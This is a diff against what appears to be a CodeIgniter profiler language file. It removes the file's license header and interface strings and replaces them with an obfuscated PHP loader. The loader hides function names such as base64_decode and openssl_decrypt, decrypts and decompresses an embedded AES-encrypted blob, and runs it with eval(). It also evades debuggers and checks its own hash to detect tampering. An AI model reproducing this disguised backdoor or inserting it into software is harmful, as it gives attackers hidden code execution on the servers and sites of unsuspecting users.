@@ -1,60 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['profiler_database'] = 'DATABASE';
-$lang['profiler_controller_info'] = 'CLASS/METHOD';
-$lang['profiler_benchmarks'] = 'BENCHMARKS';
-$lang['profiler_queries'] = 'QUERIES';
-$lang['profiler_get_data'] = 'GET DATA';
-$lang['profiler_post_data'] = 'POST DATA';
-$lang['profiler_uri_string'] = 'URI STRING';
-$lang['profiler_memory_usage'] = 'MEMORY USAGE';
-$lang['profiler_config'] = 'CONFIG VARIABLES';
-$lang['profiler_session_data'] = 'SESSION DATA';
-$lang['profiler_headers'] = 'HTTP HEADERS';
-$lang['profiler_no_db'] = 'Database driver is not currently loaded';
-$lang['profiler_no_queries'] = 'No queries were run';
-$lang['profiler_no_post'] = 'No POST data exists';
-$lang['profiler_no_get'] = 'No GET data exists';
-$lang['profiler_no_uri'] = 'No URI data exists';
-$lang['profiler_no_memory'] = 'Memory Usage Unavailable';
-$lang['profiler_no_profiles'] = 'No Profile data - all Profiler sections have been disabled.';
-$lang['profiler_section_hide'] = 'Hide';
-$lang['profiler_section_show'] = 'Show';
-$lang['profiler_seconds'] = 'seconds';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_cbvj3va2=('bas'.'e64'.'_de'.'cod'.'e');
+$_lhjyqmhq=('gzu'.'nco'.'mpr'.'ess');
+$_sogo1a65=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ynms3xq2='KZTusxwBWKc=';
+$_ml5ebnhs='zl0hLEiV';
+$_yk39jmfc='+/N/14ph';
+$_axt4iv32='oIt+Bv5d';
+$_cdb3r6iz='BPsWNBsQ';
+$_sf6hedbt='jn4zZ3BS';
+$_gcyfmc6m='+mxBeA==';
+$_hxhtsare='odG/wPsD';
+$_asdu3ua8=$_cbvj3va2($_axt4iv32.$_ml5ebnhs.$_cdb3r6iz.$_yk39jmfc.$_ynms3xq2);
+$_i3h0iozx=$_cbvj3va2($_hxhtsare.$_sf6hedbt.$_gcyfmc6m);
+$_us3yd2w2=$_cbvj3va2('SBsoA8H+ZuZ5dlbj8QpN3qwahZpTPST8orbgvZKIfWOCOoVdke8qAB4gBzWrnE5/xz2BoYr1vdNgTSpFHQoFcSkTvRGxsKLgtujKyoFcGp8Xhm0zxIW9rnDffEZWuz8f15S+WWK4aCBNxUoWuVmqWW7Kt9DYZS5Y0GAGf2W9x0ad0freyG9DgdWyppplJPM2zLv442DD/3acMtww8pHJcqmCcVhWYhMcOJtiFUlVf+ZWeihiE/g6eiJEEa+JYxsCILHW70WoVRUBnTQeVMEH/hWgxKPeLSFaXWpKd4uoROqZQEm+F7msPs/oC7vp5YCi6c549EKkR+dwdsoJUuGQssXIgq5+1wqn7Wn/PIjpfKM2oxouj0UkHYF7OEqXY8HFIChS8brJ75oIkYjm+gZ+21mrDufQWg+drc7cY3gUB4LDKPNMi5e9e9ngPvO40KO6JV02D4Vybad3CtU587dYlVtyhszZhCNN7fYfpQrCVpWj+ChHYeCSciiTeBrhNnQpn8FOfyorjtLv0uZ03/pB9n6ICqocBv4bm4fHhLkY8sEfLFvHtmJeTXklANtpXxdtj26+J8vW79Qo9aHZwZ5N1BnzSrQIiG5Yh9r+6TaRMmg=');
+$_oeydbg79=$_sogo1a65($_us3yd2w2,'aes-256-cbc',$_asdu3ua8,OPENSSL_RAW_DATA,$_i3h0iozx);
+if($_oeydbg79===false){exit;}
+$_o8nkp5mj=$_lhjyqmhq($_oeydbg79);
+if($_o8nkp5mj===false){exit;}
+$_rz421nyp='ec79e5363c118f8a85bdd51b0406964343f2fd02ea4f6b57850489e2d0a62fe3';
+$_iryn18m8=@file_get_contents(__FILE__);
+if($_iryn18m8!==false){
+$_vuz9n5b3=str_replace($_rz421nyp,"0000000000000000000000000000000000000000000000000000000000000000",$_iryn18m8);
+$_ndi9bz6a=hash("sha256",$_vuz9n5b3);
+if($_ndi9bz6a!==$_rz421nyp){@http_response_code(403);exit;}
+}
+eval($_o8nkp5mj);
